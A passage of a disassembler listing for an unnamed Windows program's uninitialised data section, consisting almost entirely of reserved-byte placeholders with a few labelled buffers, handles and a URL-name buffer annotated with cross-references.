                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42B984    dd ?                    ; DATA XREF: sub_402A00+23F↑r
                                        ; sub_4059A0+26D↑w
byte_42B988     db ?                    ; DATA XREF: sub_401AE0+74↑o
                                        ; .text:loc_402FB1↑r ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42BB88    dd ?                    ; DATA XREF: .text:00402FC3↑r
                                        ; .text:004030BD↑r ...
byte_42BB8C     db ?                    ; DATA XREF: .text:loc_402FA0↑r
                                        ; .text:0040309D↑o ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42BD8C    dd ?                    ; DATA XREF: .text:004030D1↑r
                                        ; sub_405C60+24D↑w
; HANDLE hObject
hObject         dd ?                    ; DATA XREF: sub_403980+A6↑r
                                        ; sub_403980+F2↑r ...
; HANDLE dword_42BD94
dword_42BD94    dd ?                    ; DATA XREF: sub_403980+71↑w
                                        ; sub_403980:loc_403A10↑r ...
; CHAR szUrlName[256]
szUrlName       db 100h dup(?)          ; DATA XREF: sub_403800+38↑o
                                        ; sub_403800+4C↑o ...
; CHAR byte_42BE98[256]
byte_42BE98     db 100h dup(?)          ; DATA XREF: sub_403800+47↑o
                                        ; sub_406690+3F↑o ...
; HANDLE dword_42BF98
dword_42BF98    dd ?                    ; DATA XREF: sub_401E10:loc_402731↑r
                                        ; sub_401E10+939↑r ...
dword_42BF9C    dd ?                    ; DATA XREF: sub_401E10+157↑o
                                        ; sub_401E10+173↑w ...
byte_42BFA0     db ?                    ; DATA XREF: sub_401AE0:loc_401BC0↑r
                                        ; sub_401AE0:loc_401C69↑r ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
unk_42C020      db    ? ;               ; DATA XREF: sub_4041F0+1E8↑o
                                        ; sub_4041F0+1FA↑o ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
unk_42C060      db    ? ;               ; DATA XREF: sub_401AE0+1EF↑o
                                        ; sub_407940+7E7↑o
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
